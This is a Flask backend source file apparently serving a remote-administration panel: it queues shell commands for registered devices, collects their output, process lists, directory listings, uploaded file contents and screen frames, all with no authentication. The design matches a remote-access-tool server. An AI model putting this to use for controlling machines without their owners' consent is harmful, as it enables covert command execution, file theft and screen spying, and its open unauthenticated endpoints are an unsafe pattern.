from flask import Flask, request, jsonify
from flask_cors import CORS

app = Flask(__name__)
CORS(app, origins=["http://localhost:3000", "https://python-backend-y3ul.onrender.com"])

devices = []
frames = {}
commands = {}
cmd_results = {}
processes = {}
files = {}       # "device:path" -> list of {name, type, size}
file_data = {}   # "device:path" -> base64 content

@app.route('/')
def home():
    return "backend running"

@app.route('/api/devices', methods=['GET'])
def list_devices():
    return jsonify(devices)

@app.route('/api/devices', methods=['POST'])
def add_device():
    devices.append(request.json)
    return jsonify({"ok": True})

@app.route('/api/command', methods=['POST'])
def send_command():
    data = request.json
    device = data.get('device_id') or data.get('device')
    cmd = data.get('command', '')
    commands.setdefault(device, []).append(cmd)
    return jsonify({"ok": True})

@app.route('/api/commands', methods=['GET'])
def get_commands():
    device = request.args.get('device')
    cmds = commands.pop(device, [])
    return jsonify({"commands": cmds})

@app.route('/api/command_result', methods=['POST'])
def post_result():
    data = request.json
    device = data.get('device')
    output = data.get('output', '')
    cmd_results[device] = output
    return jsonify({"ok": True})

@app.route('/api/command_result', methods=['GET'])
def get_result():
    device = request.args.get('device')
    return jsonify({"output": cmd_results.get(device, "")})

@app.route('/api/processes', methods=['GET'])
def get_processes():
    device = request.args.get('device')
    return jsonify({"processes": processes.get(device, [])})

@app.route('/api/processes', methods=['POST'])
def post_processes():
    data = request.json
    device = data.get('device')
    processes[device] = data.get('processes', [])
    return jsonify({"ok": True})

@app.route('/api/files', methods=['GET'])
def get_files():
    device = request.args.get('device')
    path = request.args.get('path', '.')
    key = device + ':' + path
    return jsonify({"files": files.get(key, [])})

@app.route('/api/files', methods=['POST'])
def post_files():
    data = request.json
    device = data.get('device')
    path = data.get('path', '.')
    key = device + ':' + path
    files[key] = data.get('files', [])
    return jsonify({"ok": True})

@app.route('/api/file', methods=['GET'])
def get_file():
    device = request.args.get('device')
    path = request.args.get('path', '')
    key = device + ':' + path
    content = file_data.get(key)
    if content is not None:
        return jsonify({"content": content})
    return jsonify({"content": None}), 404

@app.route('/api/file', methods=['POST'])
def post_file():
    data = request.json
    device = data.get('device')
    path = data.get('path', '')
    content = data.get('content', '')
    key = device + ':' + path
    file_data[key] = content
    return jsonify({"ok": True})

@app.route('/api/file', methods=['DELETE'])
def delete_file():
    device = request.args.get('device')
    path = request.args.get('path', '')
    key = device + ':' + path
    files.pop(key, None)
    file_data.pop(key, None)
    return jsonify({"ok": True})

@app.route('/api/frame', methods=['POST'])
def upload_frame():
    data = request.json
    device = data.get('device')
    image = data.get('image')
    if device and image:
        frames[device] = image
    return jsonify({"ok": True})

@app.route('/api/frame', methods=['GET'])
def get_frame():
    device = request.args.get('device')
    img = frames.get(device)
    if img:
        return jsonify({"image": img})
    return jsonify({"image": None})

@app.route('/api/stream/<device>', methods=['GET'])
def stream(device):
    img = frames.get(device)
    if img:
        return jsonify({"image": img})
    return jsonify({"image": None})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
